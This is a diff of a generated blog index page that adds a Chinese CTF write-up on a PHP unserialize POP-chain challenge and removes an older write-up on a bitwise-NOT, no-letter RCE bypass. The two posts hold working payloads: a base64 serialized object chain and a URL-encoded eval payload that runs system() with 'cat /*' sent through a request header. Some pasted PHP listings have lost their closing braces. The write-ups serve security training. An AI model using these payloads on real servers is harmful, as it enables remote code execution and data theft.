@@ -69,6 +69,64 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-第四周3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A83/" class="article-date">
+  <time class="dt-published" datetime="2025-02-03T11:45:04.000Z" itemprop="datePublished">2025-02-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A83/">第四周3</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <ol>
+<li><p>打开环境 php代码映入眼帘</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// flag.php</span><br><span class="line">class teacher&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">    public <span class="variable">$rank</span>;</span><br><span class="line">    private <span class="variable">$salary</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = 10000)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line"> </span><br><span class="line">class classroom&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">    public <span class="variable">$leader</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$name</span>,<span class="variable">$leader</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">hahaha</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> or <span class="variable">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> or <span class="variable">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">class school&#123;</span><br><span class="line">    public <span class="variable">$department</span>;</span><br><span class="line">    public <span class="variable">$headmaster</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$department</span>,<span class="variable">$ceo</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">IPO</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="built_in">echo</span> new <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;department-&gt;hahaha()) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;IPO();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>代码审计  先看危险点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> new <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">可以利用原生类注入</span><br></pre></td></tr></table></figure>
+<p>看到魔法函数 wakeup  在反序列化时自动触发</p>
+</li>
+<li><p>想办构造pop链<br>当反序列化时会自动触发wakeup函数 我们需要让：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$this</span>-&gt;department-&gt;hahaha())  </span><br><span class="line">返回<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p>   我们要调动classroom类中的hahaha函数：</p>
+   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> or <span class="variable">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> or <span class="variable">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)</span><br><span class="line">让其返回flase 即可</span><br></pre></td></tr></table></figure>
+<p>   我们需要调用teacher类  让该类下的name&#x3D;ing   rank&#x3D;department 即可</p>
+</li>
+<li><p>写代码:</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// flag.php</span><br><span class="line">class teacher&#123;</span><br><span class="line">    public <span class="variable">$name</span>=<span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line">    public <span class="variable">$rank</span>=<span class="string">&#x27;department&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">class classroom&#123;</span><br><span class="line">    public <span class="variable">$name</span>=<span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">    public <span class="variable">$leader</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">class school&#123;</span><br><span class="line">    public <span class="variable">$department</span>;</span><br><span class="line">    public <span class="variable">$headmaster</span>=<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=new school();</span><br><span class="line"><span class="variable">$b</span>=new classroom();</span><br><span class="line"><span class="variable">$c</span>=new teacher();</span><br><span class="line"><span class="variable">$a</span>-&gt;department=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;leader=<span class="variable">$c</span>;</span><br><span class="line"><span class="built_in">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">结果：                      </span><br><span class="line">Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjoyOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO319czoxMDoiaGVhZG1hc3RlciI7czozOiJvbmciO30=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>成功获得flag</p>
+</li>
+</ol>
+<p>5.总结：<br>  这个题目考察原生类利用<br>  其他的就是正常的反序列化程序</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A83/" data-id="cm6p095kj0000ukui5pt9em0p" data-title="第四周3" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-第四周2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A82/" class="article-date">
@@ -584,79 +642,6 @@
 
 
   
-    <article id="post-第一周2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/" class="article-date">
-  <time class="dt-published" datetime="2025-01-13T02:50:23.000Z" itemprop="datePublished">2025-01-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/">第一周2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>[鹏城杯 2022]简单的php</p>
-<ol>
-<li>打开环境 发现php代码 如下：<?php
-show_source(__FILE__);
- $code = $_GET['code'];
- if(strlen($code) > 80 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/is',$code)){
-     die(' Hello');
- }else if(';' ===preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
-     @eval($code);
-
- }</li>
-</ol>
-<p>?&gt; </p>
-<ol start="2">
-<li><p>代码审计 对于 “if(strlen($code) &gt; 80 or preg_match(‘&#x2F;[A-Za-z0-9]|&#39;|”|&#96;|\ |,|.|-|+|&#x3D;|/|\|&lt;|&gt;|$|?|^|&amp;||&#x2F;is’,$code))”<br>就是用get方式提交的code参数 字符串长度大于80 或者 code参数不能有任何字母和数字 还有” ‘等一些符号<br>这时我们发现 没有过滤 ~ 这个符号<br>这个时候就想到了取反</p>
-</li>
-<li><p>对于”(‘;’ &#x3D;&#x3D;&#x3D;preg_replace(‘&#x2F;[^\s()]+?((?R)?)&#x2F;‘, ‘’, $code))”<br>‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[^\s()]+?((?R)?)&#x2F;‘, ‘’, $code)<br>[^\s()]+? 表示不匹配所有空白符和() 一次或多次<br>((?R)?) 表示循环匹配() 一次或0次<br>那么这题的解法就属于无参数的取反RCE，并且需要二维数组绕过<br>payload：system(end(getallheaders()));<br>构造取反二维数组拼接 [system]<a href="%5Bend%5D%5B0%5D(%5Bgetallheaders%5D%5B0%5D())">0</a></p>
-</li>
-<li><p>用上我们的取反代码 如下：</p>
- <?php
-echo '~'.urlencode(~'system');
-echo "\n";
-echo '~'.urlencode(~'end');
-echo  "\n";
-echo '~'.urlencode(~'getallheaders');
-echo  "\n";
-echo '~'.urlencode(~'0');
-?>
-<p>最终payload：<br>[<del>%8C%86%8C%8B%9A%92][!%FF]([</del>%9A%91%9B]<a href="%5B~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%5D%5B!%EF%BF%BD%5D()">!%FF</a>);</p>
-</li>
-<li><p>最后在burp抓包的get方式提交 code&#x3D;[<del>%8C%86%8C%8B%9A%92][!%FF]([</del>%9A%91%9B]<a href="%5B~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%5D%5B!%EF%BF%BD%5D()">!%FF</a>);<br>在请求头中 随便加一个  eg：x:cat &#x2F;*<br>发现flag</p>
-</li>
-<li><p>总结：<br>这题就是无回显rce  无字母<br>可以用取反 异或等方式去写<br>用取反的时候 如果 ~ 没有被过滤的前提下</p>
-</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/" data-id="cm5ulxzzp000c6gui19ideqfg" data-title="第一周2" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -693,6 +678,10 @@ echo '~'.urlencode(~'0');
       <ul>
         
           <li>
+            <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A83/">第四周3</a>
+          </li>
+        
+          <li>
             <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A82/">第四周2</a>
           </li>
         
@@ -706,10 +695,6 @@ echo '~'.urlencode(~'0');
         
           <li>
             <a href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A82/">第三周2</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A81/">第三周1</a>
           </li>
         
       </ul>
